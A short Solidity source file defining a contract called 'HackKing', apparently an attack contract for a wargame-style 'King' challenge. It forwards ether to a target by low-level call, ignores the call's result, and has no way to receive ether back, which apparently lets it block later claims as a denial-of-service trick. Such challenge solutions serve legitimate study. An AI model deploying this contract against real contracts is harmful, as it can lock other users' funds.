// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackKing {

    function send(address ad) external payable {
        (bool success, ) = ad.call{value: msg.value}("");
    }
}